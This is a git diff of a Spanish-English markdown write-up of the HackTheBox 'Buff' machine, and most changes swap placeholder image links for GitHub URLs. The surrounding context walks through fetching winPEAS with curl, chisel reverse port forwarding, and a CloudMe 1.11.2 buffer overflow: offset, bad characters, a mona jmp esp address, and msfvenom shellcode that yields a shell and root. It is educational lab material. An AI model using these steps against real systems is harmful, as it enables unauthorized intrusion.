@@ -200,8 +200,8 @@ We are able to upload the WinPEAS.exe file by serving an http.server on our linu
 ```bash
 [Target windows system]curl -o winPEAS.exe http://[OURIP]/winPEAS.exe
 ```
-![pythonclient](pendiente)
-![pythonserver](pendiente)
+![pythonclient](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/pythonclient.PNG)
+![pythonserver](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/pythonserver.PNG)
 
 Once we got the WinPEAS in the target machine, we are going to execute it with the command:
 ```cmd
@@ -209,7 +209,7 @@ winPEAS.exe
 ```
 
 We can see something interesting in the winPEAS.exe output 
-![winpeas](pendiente)
+![winpeas](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/winpeas.PNG)
 a "C:\Users\shaun\Downloads\Cloudme_1112.exe"
 
 ¿What is Cloudme? [https://en.wikipedia.org/wiki/CloudMe]
@@ -219,7 +219,7 @@ How can we check this?
 We can do a "CloudMe default port" search and we can see that:
 _"CloudMe Sync is a synchronization application that synchronizes your local storage with cloud storage, and is listening on port 8888"_
 
-![cloudmePORT](pendiente)
+![cloudmePORT](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/CloudMePORT.PNG)
 
 The service is indeed active listening on port 8888 of the machine!
 So, what can we do?
@@ -229,7 +229,7 @@ searchsploit cloudme
 ```
 searchsploit shows us a Buffer overflow exploit where CloudMe version 1.11.2 is vulnerable
 
-![searchsploit](pendiente)
+![searchsploit](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/searchsploit.PNG)
 
 We can examine the code. we can see that the exploit runs the Windows calculator. So we could make some changes and run the exploit directly and **terminate the machine.**
 
@@ -254,7 +254,7 @@ In addition, in our Windows system it is necessary that we have installed the fo
 - **7Zip** | (https://www.7-zip.org/download.html)
 
 We should see something like this on our Windows machine:
-![cloudmewin](pendiente)
+![cloudmewin](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/cloudmewin.PNG)
 
 With Chisel we are going to create a private tunnel in which we are going to make port 8888 of our remote machine [Windows] accessible. (We will need to have chisel on our linux machine and our windows machine.) **[reverse port forwarding]**
 
@@ -267,14 +267,14 @@ To establish this, in our Linux machine (Attacker) we will execute in the direct
 ```bash
 ./chisel server --reverse -p [PORT]
 ```
-![chiselserver](pendiente)
+![chiselserver](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/chiselserver.PNG)
 
 To establish this, in our Windows machine (Target) we will execute in the directory where chisel is located:
 (Here, "PORT" has to be the same as in the previous command)
 ```bash
 ./chisel.exe client [Linux IP]:[PORT] R:8888:127.0.0.1:8888
 ```
-![chiselclient](pendiente)
+![chiselclient](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/chiselclient.PNG)
 
 **These commands indicate that traffic received on port 8888 on the Windows machine will be redirected through the tunnel created by Chisel to port 8888 on the Linux machine.** 
 
@@ -318,7 +318,7 @@ Now, with **_immunity debugger_**, let's see what is supposed to happen when the
 
 Let's attach the CloudMe process by clicking on file --> attach
 
-![Immunityattach](pendiente)
+![Immunityattach](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Immunityattach.png)
 
 We can see at the bottom left that the process will be "paused", so we will click on the "Run Program" button or press <F9> for Run the Program
 
@@ -326,12 +326,13 @@ So let's run the exploit again and see what happens.
 
 
 
-![414141](pendiente)
+![414141](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/41414141.png)
 CloudMe by not sanitizing the user input, the user is able to send a payload that exceeds the amount of bytes reserved in the Buffer for the user input. Thus, the payload escapes the allocated buffer frame by overwriting other adjacent areas of memory.
 
 So the program is paused because "EIP" points the program flow to an address that does not exist (0x414141).
 
-![buffer](pendiente)
+![buffer](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/buffer.png)
+(Image taken from: https://www.davidromerotrejo.com/2018/09/buffer-overflow-attack.html)
 In this image, "RET" refers to "EIP" in Immunity Debugger.
 
 So, as attackers, **what is our target?.**
@@ -365,7 +366,7 @@ This exact point is called **"offset"**
 
 So let's run the exploit again
 
-![316A4230](pendiente)
+![316A4230](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/316A4230.png)
 
 EIP = 316A4230
 [https://es.wikipedia.org/wiki/Endianness]
@@ -437,13 +438,13 @@ if __name__ == '__main__':
 ```
 We run the script and see that the EIP is pointing to the process **"0x4242424242".**
 This corresponds to "BBBB"
-![42424242](pendiente)
+![42424242](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/42424242.png)
 
 and we can see that in the "ESP" section the "C" characters are being stored.
 By right-clicking on the ESP, we can click on "Follow in Dump"
-![ESP1](pendiente)
+![ESP1](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/ESP1.png)
 and we can see that right after the EIP "BBBB", the "C" characters are being stored in the ESP.
-![ESP2](pendiente)
+![ESP2](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/ESP2.png)
 Then, we could control the flow of the program in the EIP.
 So instead of placing "C" we could load malicious instructions into the program.
 
@@ -476,14 +477,14 @@ This **_ByteArray_** can be used to see which characters the "CloudMe" service a
 
 >[[Make sure to delete all the output above the bytearray].
 
-![bytearray](pendiente)
+![bytearray](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/bytearray.png)
 
 We can quickly transfer the ByteArray.txt file to our Linux machine by establishing a "smbserver" like we did before and on our Windows machine by putting the ip address by accessing the "smbFolder" directory
 
 ```bash
 smbserver.py smbFolder $(pwd) -smb2support
 ```
-![smbFolder](pendiente)
+![smbFolder](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/smbFolder.png)
 
 Now, within the python exploit, we are momentarily going to define a variable and we will remove "after_EIP"
 ```badchars = (b"\x00\x01\x02\x03\x0..<SNIP>``` #each line of the ByteArray must begin with b"...
@@ -495,7 +496,7 @@ Thus the content of “badchars” will be stored in the “ESP” region.
 **Execute the exploit**
 
 By right-clicking on the ESP, we can click on "Follow in Dump"
-![bytearraydump](pendiente)
+![bytearraydump](.https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/bytearraydump.png)
 
 We can see here those characters that the software allows
 It is advisable most of the time to remove the [00] character. If by chance any character does not appear, it means that the program does not accept it. Thus, it will be necessary to remove this character and try again by sending the script, and check for any other character that may appear. In this case, all characters are accepted.
@@ -529,19 +530,19 @@ Allí, ejecutaremos en la linea de comandos:
 Here, we will see the modules loaded in the running process. 
 Those modules that have the value "False" in all columns will be of interest to us
 
-![dllmodule](pendiente)
+![dllmodule](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/dllmodule.PNG)
 
 Here we will see a dll file called "Qt5Core.dll". This module is potentially useful to check if it contains any address that, at the level of OP Code, contains an instruction 'jmp esp'.
 Let's execute at the Immunity Debugger command line:
 ```sh
 !mona find -s "\xFF\xE4" -m Qt5Core.dll
 ```
-![execute_read](pendiente)
+![execute_read](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/execute_read.PNG)
 
 Now, we can see that this address **'0x68a98a7b'** executes a 'jmp esp'.
 And there are **'Execute_Read'** privileges on this address, which are necessary in the sense that this will allow us to execute our commands.
 
-![icono](pendiente)
+![icono](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/icono.PNG)
 
 We will go to section 'c' in the top bar, and there we will click on the icon:
 
@@ -550,7 +551,7 @@ Next, we will input the address '0x68a98a7b'.
 Now, as we want the program flow to go to the 'ESP' because this is where we want to execute commands, it is of interest to us that 'EIP' points to the address '0x68a98a7b'.
 
 So, to verify this, by clicking on the address '0x68a98a7b', we will press <F2> to set a breakpoint.
-![breakpoint](pendiente)
+![breakpoint](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/breakpoint.PNG)
 
 ```python3
 #!/usr/bin/python3
@@ -599,11 +600,11 @@ if __name__ == '__main__':
 **It is written in reverse due to the little-endian format.**
 **With this code, we are going to validate if "EIP" indeed points to "ESP".**
 
-![EIPESP](pendiente)
+![EIPESP](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/EIPESP.PNG)
 
 So, we have verified that indeed, EIP holds the address of ESP. Now, pay attention that by clicking on the icon (Step into) or pressing <F7>, the program flow goes to the address of ESP. And what is stored in ESP? For now, those values associated with our variable "badchars".
 
-![caracteresESP](pendiente)
+![caracteresESP](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/caracteresESP.PNG)
 
 Now, the interesting thing is that everything stored in "ESP" will be executed due to the **Execute_Read** privileges.
 Now what we will do is, using the msfvenom tool, generate a shellcode that points to our address, sending a direct console directive
@@ -665,9 +666,9 @@ if __name__ == '__main__':
 
     makeConnection()
 ```
-![sucess](pendiente)
+![sucess](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/success.PNG)
 
-Now, we have accessed the target machine.
+Now, we have accessed to the target machine.
 
 
 # Buffer Overflow Exploitation and Root Access
@@ -701,15 +702,15 @@ Let's do the same thing we did in the **_'Origin of the exploit, why, and how do
 - [Linux machine]: Chisel Server
 - [Windows machine]: Chisel Client
 
-![chiselultimo](pendiente)
+![chiselultimo](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/chiselultima.PNG)
 
 Now we run again the exploit.
 
-![roottxt](pendiente)
+![roottxt](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/roottxt.PNG)
 
-Pwned.
+**Pwned.**
 
-
+***
 
 
 ***
